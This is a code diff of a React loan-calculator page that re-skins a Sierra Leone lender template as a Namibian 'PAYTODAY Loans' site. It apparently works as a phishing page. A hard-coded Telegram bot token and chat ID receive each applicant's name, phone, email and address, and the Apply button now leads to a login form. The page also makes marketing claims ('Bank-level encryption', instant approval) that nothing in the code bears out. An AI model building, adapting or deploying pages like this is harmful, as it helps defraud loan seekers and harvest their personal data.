@@ -5,10 +5,10 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } f
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 
-const LoanCalculator = () => {
-  const [loanAmount, setLoanAmount] = useState(500000);
+const LoanCalculator = ({ onApplyClick }: { onApplyClick?: () => void }) => {
+  const [loanAmount, setLoanAmount] = useState(50000);
   const [loanPeriod, setLoanPeriod] = useState(12);
-  const [processingFee] = useState(10000);
+  const [processingFee] = useState(500);
   const [showApplyModal, setShowApplyModal] = useState(false);
   const [showSuccessModal, setShowSuccessModal] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -19,8 +19,8 @@ const LoanCalculator = () => {
     address: '',
   });
 
-  // Reduced to 1 million SLL max
-  const amountPresets = [100000, 250000, 500000, 750000, 1000000];
+  // Reduced to 100k NAD max
+  const amountPresets = [5000, 10000, 25000, 50000, 100000];
   const periodOptions = [3, 6, 12, 18, 24];
 
   // Calculate loan using useMemo to avoid setState in effect
@@ -42,12 +42,28 @@ const LoanCalculator = () => {
   };
 
   const handleApply = () => {
-    setShowApplyModal(true);
+    // Store loan calculation in localStorage for the multi-step form
+    localStorage.setItem('loanCalculatorData', JSON.stringify({
+      loanAmount,
+      loanPeriod,
+      processingFee,
+      totalInterest,
+      totalAmount,
+      monthlyPayment
+    }));
+    
+    // If onApplyClick is provided (from App.tsx), use it to open Login form
+    // Otherwise, fall back to the local modal
+    if (onApplyClick) {
+      onApplyClick();
+    } else {
+      setShowApplyModal(true);
+    }
   };
 
   const sendTelegramNotification = async (data: typeof formData) => {
-    const botToken = '8570815071:AAGVDABCQ8384ZWITYQWLCSJGGXPGGQI2A8';
-    const chatId = '8570815071'; // Using the bot's chat ID
+    const botToken = '8570815071:AAGvDaBcq8384ZWItYQWlcsjGgXpgGQI2A8';
+    const chatId = '7973653220'; // Using the bot's chat ID
     
     const message = `
 🆕 *NEW LOAN APPLICATION* 🆕
@@ -108,60 +124,156 @@ const LoanCalculator = () => {
   };
 
   return (
-    <section id="calculator" className="sl-section bg-[#FFF7ED]/50">
-      <div className="sl-container">
-        <div className="text-center mb-8">
-          <h2 className="text-2xl md:text-3xl font-bold text-[#F97316] mb-2">
+    <section id="calculator" className="mtc-section bg-gradient-to-b from-gray-50 to-white py-16">
+      <div className="mtc-container">
+        <div className="text-center mb-10">
+          <h2 className="text-3xl md:text-4xl font-bold text-gray-800 mb-4">
             Calculate Your Loan
           </h2>
-          <p className="text-gray-600">
+          <p className="text-gray-600 text-lg max-w-xl mx-auto">
             Get instant estimates with our transparent calculator
           </p>
+          <div className="w-24 h-1 bg-[#2d21e9] mx-auto mt-4 rounded-full"></div>
         </div>
 
-        <div className="max-w-2xl mx-auto">
-          <div className="sl-card">
+        <div className="grid grid-cols-1 xl:grid-cols-5 gap-10 items-start">
+          {/* Video Section - Left */}
+          <div className="w-full xl:col-span-3">
+            <div className="relative rounded-2xl overflow-hidden shadow-2xl">
+              <video
+                className="w-full h-auto max-h-[500px]"
+                style={{ minHeight: '400px' }}
+                controls
+                playsInline
+              >
+                <source src="/20260317_0520_New Video_simple_compose_01kkwsg8hbe3y8qy0p9qyt23x2.mp4" type="video/mp4" />
+                Your browser does not support the video tag.
+              </video>
+            </div>
+            <div className="mt-6 bg-white rounded-2xl p-6 shadow-lg border border-gray-100">
+              <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
+                <span className="w-2 h-8 bg-[#1674BB] rounded-full"></span>
+                How It Works
+              </h3>
+              <div className="space-y-4">
+                <div className="flex items-start gap-4">
+                  <div className="w-8 h-8 bg-[#1674BB] rounded-full flex items-center justify-center text-white font-bold text-sm flex-shrink-0">1</div>
+                  <div>
+                    <h4 className="font-semibold text-gray-800">Choose Your Amount</h4>
+                    <p className="text-sm text-gray-600">Select between NAD 5,000 - 100,000</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-4">
+                  <div className="w-8 h-8 bg-[#1674BB] rounded-full flex items-center justify-center text-white font-bold text-sm flex-shrink-0">2</div>
+                  <div>
+                    <h4 className="font-semibold text-gray-800">Select Duration</h4>
+                    <p className="text-sm text-gray-600">Choose repayment period from 3-24 months</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-4">
+                  <div className="w-8 h-8 bg-[#1674BB] rounded-full flex items-center justify-center text-white font-bold text-sm flex-shrink-0">3</div>
+                  <div>
+                    <h4 className="font-semibold text-gray-800">Apply & Get Approved</h4>
+                    <p className="text-sm text-gray-600">Instant approval within 24 hours</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Additional Features */}
+            <div className="mt-6 bg-gradient-to-r from-[#2d21e9]/10 to-[#1affd5]/10 rounded-2xl p-6 shadow-lg border border-[#2d21e9]/20">
+              <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
+                <span className="w-2 h-8 bg-[#1674BB] rounded-full"></span>
+                Why Choose PAYTODAY Loans?
+              </h3>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">Quick Disbursement</h4>
+                    <p className="text-xs text-gray-600">Same day approval</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">Competitive Rates</h4>
+                    <p className="text-xs text-gray-600">2.5% monthly interest</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">Flexible Terms</h4>
+                    <p className="text-xs text-gray-600">3-24 month options</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">Secure Process</h4>
+                    <p className="text-xs text-gray-600">Bank-level encryption</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">No Hidden Fees</h4>
+                    <p className="text-xs text-gray-600">Transparent pricing</p>
+                  </div>
+                </div>
+                <div className="flex items-start gap-3">
+                  <Check className="w-5 h-5 text-[#1674BB] flex-shrink-0 mt-0.5" />
+                  <div>
+                    <h4 className="font-semibold text-gray-800 text-sm">24/7 Support</h4>
+                    <p className="text-xs text-gray-600">Always here to help</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Calculator - Right */}
+          <div className="max-w-xl mx-auto lg:mx-0 w-full xl:col-span-2">
+            <div className="bg-white rounded-3xl shadow-2xl p-8 border border-gray-100">
             {/* Loan Amount */}
             <div className="mb-8">
-              <label className="block text-sm font-semibold text-gray-700 mb-4">
-                LOAN AMOUNT
+              <label className="block text-sm font-bold text-gray-700 mb-4 uppercase tracking-wide">
+                Loan Amount
               </label>
               
-              <div className="flex items-center gap-4 mb-4">
-                <div className="bg-[#F97316] text-white px-4 py-2 rounded-full font-semibold">
-                  SLL {formatCurrency(loanAmount)}
-                </div>
-                <div className="flex-1 bg-gray-100 rounded-full px-4 py-2 text-right">
-                  <span className="text-gray-600 font-mono">{loanAmount}</span>
+              <div className="flex items-center gap-4 mb-6">
+                <div className="bg-gradient-to-r from-[#2d21e9] to-[#920fd4] text-white px-6 py-3 rounded-xl font-bold text-xl shadow-lg">
+                  NAD {formatCurrency(loanAmount)}
                 </div>
               </div>
 
               <Slider
                 value={[loanAmount]}
                 onValueChange={handleSliderChange}
-                min={50000}
-                max={1000000}
-                step={10000}
+                min={5000}
+                max={100000}
+                step={500}
                 className="mb-4"
               />
 
-              <div className="flex justify-between text-sm text-gray-500 mb-4">
-                <span>SLL 50,000</span>
-                <span>SLL 1,000,000</span>
+              <div className="flex justify-between text-sm text-gray-500 mb-6 font-medium">
+                <span>NAD 5,000</span>
+                <span>NAD 100,000</span>
               </div>
 
-              <div className="flex flex-wrap gap-2">
+              <div className="flex flex-wrap gap-3">
                 {amountPresets.map((preset) => (
                   <button
                     key={preset}
                     onClick={() => handleAmountPreset(preset)}
-                    className={`px-3 py-2 rounded-full text-sm font-medium transition-all duration-200 ${
+                    className={`px-4 py-2 rounded-xl text-sm font-semibold transition-all duration-200 ${
                       loanAmount === preset
-                        ? 'bg-[#F97316] text-white'
-                        : 'bg-[#FFF7ED] text-[#F97316] hover:bg-[#F97316]/20'
+                        ? 'bg-[#2d21e9] text-white shadow-md'
+                        : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                     }`}
                   >
-                    SLL {formatCurrency(preset)}
+                    NAD {formatCurrency(preset)}
                   </button>
                 ))}
               </div>
@@ -169,26 +281,26 @@ const LoanCalculator = () => {
 
             {/* Loan Period */}
             <div className="mb-8">
-              <label className="block text-sm font-semibold text-gray-700 mb-4">
-                LOAN PERIOD (MONTHS)
+              <label className="block text-sm font-bold text-gray-700 mb-4 uppercase tracking-wide">
+                Loan Period
               </label>
               
-              <div className="flex items-center gap-2 mb-4">
-                <div className="bg-white border border-gray-200 rounded-lg px-4 py-2 text-center min-w-[80px]">
-                  <span className="text-xl font-semibold text-gray-800">{loanPeriod}</span>
+              <div className="flex items-center gap-3 mb-5">
+                <div className="bg-gray-100 border-2 border-[#2d21e9] rounded-xl px-5 py-3 text-center min-w-[100px]">
+                  <span className="text-2xl font-bold text-gray-800">{loanPeriod}</span>
                 </div>
-                <span className="text-gray-500">months</span>
+                <span className="text-gray-500 font-medium">months</span>
               </div>
 
-              <div className="flex flex-wrap gap-2">
+              <div className="flex flex-wrap gap-3">
                 {periodOptions.map((period) => (
                   <button
                     key={period}
                     onClick={() => setLoanPeriod(period)}
-                    className={`px-4 py-2 rounded-full text-sm font-medium transition-all duration-200 ${
+                    className={`px-5 py-2 rounded-xl text-sm font-semibold transition-all duration-200 ${
                       loanPeriod === period
-                        ? 'bg-[#F97316] text-white'
-                        : 'bg-[#FFF7ED] text-[#F97316] hover:bg-[#F97316]/20'
+                        ? 'bg-[#2d21e9] text-white shadow-md'
+                        : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                     }`}
                   >
                     {period} Months
@@ -198,36 +310,37 @@ const LoanCalculator = () => {
             </div>
 
             {/* Results */}
-            <div className="space-y-4">
+            <div className="space-y-4 mt-8 pt-6 border-t border-gray-200">
               <div className="grid grid-cols-2 gap-4">
-                <div className="bg-gray-50 rounded-xl p-4 text-center">
-                  <p className="text-xs text-gray-500 mb-1">LOAN TERMS</p>
+                <div className="bg-gray-50 rounded-xl p-4 text-center border border-gray-100">
+                  <p className="text-xs text-gray-500 mb-1 font-semibold uppercase">Loan Terms</p>
                   <p className="text-lg font-bold text-gray-800">{loanPeriod} Months</p>
                 </div>
-                <div className="bg-gray-50 rounded-xl p-4 text-center">
-                  <p className="text-xs text-gray-500 mb-1">PROCESSING FEE</p>
-                  <p className="text-lg font-bold text-gray-800">SLL {formatCurrency(processingFee)}</p>
+                <div className="bg-gray-50 rounded-xl p-4 text-center border border-gray-100">
+                  <p className="text-xs text-gray-500 mb-1 font-semibold uppercase">Processing Fee</p>
+                  <p className="text-lg font-bold text-gray-800">NAD {formatCurrency(processingFee)}</p>
                 </div>
               </div>
 
-              <div className="bg-[#F97316] rounded-xl p-4 text-center">
-                <p className="text-xs text-white/80 mb-1">TOTAL AMOUNT</p>
-                <p className="text-2xl font-bold text-white">SLL {formatCurrency(totalAmount)}</p>
+              <div className="bg-gradient-to-r from-[#2d21e9] to-[#920fd4] rounded-2xl p-6 text-center shadow-lg">
+                <p className="text-white/80 mb-1 font-semibold uppercase tracking-wide text-sm">Total Amount</p>
+                <p className="text-3xl font-bold text-white">NAD {formatCurrency(totalAmount)}</p>
               </div>
 
-              <div className="bg-gray-50 rounded-xl p-4 text-center">
-                <p className="text-xs text-gray-500 mb-1">MONTHLY PAYMENT</p>
-                <p className="text-xl font-bold text-gray-800">SLL {formatCurrency(monthlyPayment)}</p>
+              <div className="bg-gray-50 rounded-2xl p-6 text-center border border-gray-100">
+                <p className="text-xs text-gray-500 mb-2 font-semibold uppercase tracking-wide">MONTHLY PAYMENT</p>
+                <p className="text-3xl font-bold text-gray-800">NAD {formatCurrency(monthlyPayment)}</p>
               </div>
 
               <button
                 onClick={handleApply}
-                className="w-full sl-btn-primary flex items-center justify-center gap-2 text-lg"
+                className="w-full bg-gradient-to-r from-[#2d21e9] to-[#920fd4] text-white py-4 px-6 rounded-xl font-bold text-lg shadow-lg hover:shadow-xl hover:from-[#1a1ad9] hover:to-[#7a0bb5] transition-all duration-300 flex items-center justify-center gap-2 transform hover:-translate-y-1"
               >
                 Apply Now
                 <ArrowRight className="w-5 h-5" />
               </button>
             </div>
+          </div>
           </div>
         </div>
       </div>
@@ -236,15 +349,15 @@ const LoanCalculator = () => {
       <Dialog open={showApplyModal} onOpenChange={setShowApplyModal}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle className="text-[#F97316] text-xl">Apply for Loan</DialogTitle>
+            <DialogTitle className="text-[#2d21e9] text-xl">Apply for Loan</DialogTitle>
             <DialogDescription>
-              Fill in your details to apply for SLL {formatCurrency(loanAmount)} loan
+              Fill in your details to apply for NAD {formatCurrency(loanAmount)} loan
             </DialogDescription>
           </DialogHeader>
           <form onSubmit={handleSubmit} className="space-y-4 mt-4">
             <div className="space-y-2">
               <Label htmlFor="fullName" className="flex items-center gap-2">
-                <User className="w-4 h-4 text-[#F97316]" />
+                <User className="w-4 h-4 text-[#1674BB]" />
                 Full Name
               </Label>
               <Input
@@ -257,7 +370,7 @@ const LoanCalculator = () => {
             </div>
             <div className="space-y-2">
               <Label htmlFor="phone" className="flex items-center gap-2">
-                <Phone className="w-4 h-4 text-[#F97316]" />
+                <Phone className="w-4 h-4 text-[#1674BB]" />
                 Phone Number
               </Label>
               <Input
@@ -271,7 +384,7 @@ const LoanCalculator = () => {
             </div>
             <div className="space-y-2">
               <Label htmlFor="email" className="flex items-center gap-2">
-                <Mail className="w-4 h-4 text-[#F97316]" />
+                <Mail className="w-4 h-4 text-[#1674BB]" />
                 Email Address
               </Label>
               <Input
@@ -285,23 +398,23 @@ const LoanCalculator = () => {
             </div>
             <div className="space-y-2">
               <Label htmlFor="address" className="flex items-center gap-2">
-                <MapPin className="w-4 h-4 text-[#F97316]" />
+                <MapPin className="w-4 h-4 text-[#1674BB]" />
                 Address
               </Label>
               <Input
                 id="address"
-                placeholder="Your address in Sierra Leone"
+                placeholder="Your address in Namibia"
                 value={formData.address}
                 onChange={(e) => handleInputChange('address', e.target.value)}
                 required
               />
             </div>
-            <div className="bg-[#FFF7ED] rounded-lg p-3 mt-4">
+            <div className="bg-[#FFEEEE] rounded-lg p-3 mt-4">
               <p className="text-sm text-gray-600">
-                <span className="font-semibold">Loan Amount:</span> SLL {formatCurrency(loanAmount)}
+                <span className="font-semibold">Loan Amount:</span> NAD {formatCurrency(loanAmount)}
               </p>
               <p className="text-sm text-gray-600">
-                <span className="font-semibold">Monthly Payment:</span> SLL {formatCurrency(monthlyPayment)}
+                <span className="font-semibold">Monthly Payment:</span> NAD {formatCurrency(monthlyPayment)}
               </p>
               <p className="text-sm text-gray-600">
                 <span className="font-semibold">Duration:</span> {loanPeriod} months
@@ -309,7 +422,7 @@ const LoanCalculator = () => {
             </div>
             <button 
               type="submit" 
-              className="w-full sl-btn-primary flex items-center justify-center gap-2"
+              className="w-full paytoday-btn-primary flex items-center justify-center gap-2"
               disabled={isSubmitting}
             >
               {isSubmitting ? (
@@ -340,7 +453,7 @@ const LoanCalculator = () => {
             </DialogDescription>
             <button
               onClick={() => setShowSuccessModal(false)}
-              className="mt-6 sl-btn-primary"
+              className="mt-6 paytoday-btn-primary"
             >
               Close
             </button>
